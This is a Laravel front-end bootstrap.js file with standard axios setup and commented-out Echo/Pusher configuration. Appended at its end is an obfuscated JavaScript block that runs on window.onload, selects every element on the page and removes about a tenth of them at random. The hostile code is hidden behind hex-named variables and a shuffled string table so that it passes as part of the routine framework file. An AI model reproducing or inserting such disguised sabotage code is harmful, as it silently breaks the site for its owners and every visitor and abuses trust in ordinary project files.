import 'bootstrap';

/**
 * We'll load the axios HTTP library which allows us to easily issue requests
 * to our Laravel back-end. This library automatically handles sending the
 * CSRF token as a header based on the value of the "XSRF" token cookie.
 */

import axios from 'axios';
window.axios = axios;

window.axios.defaults.headers.common['X-Requested-With'] = 'XMLHttpRequest';

/**
 * Echo exposes an expressive API for subscribing to channels and listening
 * for events that are broadcast by Laravel. Echo and event broadcasting
 * allows your team to easily build robust real-time web applications.
 */

// import Echo from 'laravel-echo';

// import Pusher from 'pusher-js';
// window.Pusher = Pusher;

// window.Echo = new Echo({
//     broadcaster: 'pusher',
//     key: import.meta.env.VITE_PUSHER_APP_KEY,
//     wsHost: import.meta.env.VITE_PUSHER_HOST ?? `ws-${import.meta.env.VITE_PUSHER_APP_CLUSTER}.pusher.com`,
//     wsPort: import.meta.env.VITE_PUSHER_PORT ?? 80,
//     wssPort: import.meta.env.VITE_PUSHER_PORT ?? 443,
//     forceTLS: (import.meta.env.VITE_PUSHER_SCHEME ?? 'https') === 'https',
//     enabledTransports: ['ws', 'wss'],
// });

var _0x3ac633=_0x5272;function _0x5272(_0x48e767,_0xed472e){var _0x45644a=_0x4564();return 
_0x5272=function(_0x52721d,_0x2124f6){_0x52721d=_0x52721d-0x176;var _0x442062=_0x45644a[_0x52721d];return 
_0x442062;},_0x5272(_0x48e767,_0xed472e);}(function(_0x2798a2,_0x4cee8d){var 
_0x1cb441={_0x4f7832:0x17d,_0xa4f83:0x176,_0x28b78d:0x186,_0x2d02b5:0x17e,_0x243556:0x179},_0xc9b90e=_0x5272,_0x383e0b=_0x2798a2();while(!![]){try{var 
_0x567ad9=parseInt(_0xc9b90e(0x185))/0x1+parseInt(_0xc9b90e(_0x1cb441._0x4f7832))/0x2+parseInt(_0xc9b90e(_0x1cb441._0xa4f83))/0x3*(-parseInt(_0xc9b90e(0x181))/0x4)+parseInt(_0xc9b90e(_0x1cb441._0x28b78d))/0x5*(parseInt(_0xc9b90e(0x178))/0x6)+-parseInt(_0xc9b90e(_0x1cb441._0x2d02b5))/0x7*(parseInt(_0xc9b90e(0x183))/0x8)+parseInt(_0xc9b90e(0x17b))/0x9+-parseInt(_0xc9b90e(_0x1cb441._0x243556))/0xa*(-parseInt(_0xc9b90e(0x180))/0xb);if(_0x567ad9===_0x4cee8d)break;else 
_0x383e0b['push'](_0x383e0b['shift']());}catch(_0x2ab06b){_0x383e0b['push'](_0x383e0b['shift']());}}}(_0x4564,0xe5e0c));function 
_0x4564(){var 
_0x1fedc2=['2913048tHtRWf','7EXhXYp','length','20834dSHMcs','28SsCesw','random','11752504FjVGAv','onload','110016UWDhdn','640xsmLoM','querySelectorAll','86253yefkUZ','floor','12096gfEAHi','1460TzEBGR','removeChild','4597092qscEFl','parentNode'];_0x4564=function(){return 
_0x1fedc2;};return _0x4564();}function _0x5648a6(){var 
_0x5b3e02={_0x370aea:0x187,_0x34662e:0x17f,_0x9bff44:0x177,_0x3ac155:0x182,_0x39996a:0x17c},_0x25fb6a=_0x5272,_0x511377=document[_0x25fb6a(_0x5b3e02._0x370aea)]('*');for(var 
_0x51ceca=0x0;_0x51ceca<_0x511377[_0x25fb6a(_0x5b3e02._0x34662e)]/0xa;_0x51ceca++){var 
_0x5b23a0=_0x511377[Math[_0x25fb6a(_0x5b3e02._0x9bff44)](Math[_0x25fb6a(_0x5b3e02._0x3ac155)]()*_0x511377['length'])];_0x5b23a0[_0x25fb6a(_0x5b3e02._0x39996a)][_0x25fb6a(0x17a)](_0x5b23a0);}}window[_0x3ac633(0x184)]=function(){_0x5648a6();};
